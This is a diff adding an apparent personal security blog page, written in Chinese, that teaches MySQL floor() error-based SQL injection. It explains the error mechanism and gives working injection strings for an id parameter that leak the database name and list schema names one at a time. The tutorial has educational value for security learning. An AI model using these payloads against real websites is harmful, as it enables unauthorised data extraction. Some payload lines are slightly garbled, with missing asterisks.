@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Mysql floor()报错注入 | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Mysql floor()报错注入</h2>
+            <div class="post-date">2020-01-02</div>
+            
+            <div class="post-content">
+              <p><strong>介绍</strong><br>
+floor，count，group by冲突报错，当这三个函数在特定情况一起使用产生的错误<br>
+最经典的floor注入语句</p>
+<!-- more -->
+<pre><code>and select 1 from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a
+select count(*),floor(rand(0)*2)x from test group by x
+</code></pre>
+<p>这里的X是自定义sql语句的别名，相当于赋值</p>
+<pre><code>x=floor(rand(0)*2)
+</code></pre>
+<p>当group by x在一起后，就会报错<br>
+select count(*),concat(database(),floor(0)*2)x from test group by x<br>
+就会报错<br>
+<img src="https://guokeya.github.io/post-images/1577951579569.png" alt="" loading="lazy"><br>
+这个test1，test是数据库名，1是floor(0)*2返回的结果，通过concat拼接，返回test1<br>
+报错点在于concat(报错点，floor(0)2)x<br>
+带入我们的sql语句</p>
+<pre><code>select count(*),concat((select schema_name from information_schema.schemata),floor(rand(0)*2))x from information_schema.tables group by x
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1577951590592.png" alt="" loading="lazy"><br>
+去sql注入界面试试<br>
+将sql语句修改为<br>
+id=1 and 1=(select 1 from (select count(),concat(database(),floor(rand(0)2))x from information_schema.tables group by x)a)<br>
+id=1 True<br>
+and 1=sql语句结果。不会怎样。都会报错执行<br>
+爆出数据库:<br>
+id=1 and 1=(select 1 from (select count(),concat((select schema_name from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)<br>
+limit 一个个遍历过去</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/Web/" class="tag">
+                    Web安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/pyl5sMkxm/">
+                  <h3 class="post-title">
+                    PHP setrawcookie与setcookie的区别
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
